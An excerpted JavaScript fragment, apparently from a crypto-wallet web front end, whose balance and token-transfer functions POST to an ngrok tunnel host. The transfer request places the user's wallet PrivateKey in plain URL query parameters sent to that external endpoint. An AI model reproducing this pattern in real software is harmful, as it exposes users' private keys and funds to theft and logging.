...
function Windowtoken() {
    ...
    function AssignTokenBalance() {
        ...
        fetch(`https://f0f9-182-156-224-114.ngrok-free.app/token/balance?RPC=${rpc}&address=${address}&contractAddress=${contractAddress}&contractAbi=${contractABI}`, {
            method: 'POST'
    ...
    const TransferToken = () => {
        ...
        fetch(`https://f0f9-182-156-224-114.ngrok-free.app/transfer/token?RPC=${rpc}&contractAddress=${contract_address}&contractAbi=${contract_ABI}&Receiver=${receiver}&PrivateKey=${PrivateKey}&Amount=${amount}&Decimals=${contract_Decimals}`, {
            method: 'POST'
        }).then(response => response.json())
            .then(data => {
                console.log(data);
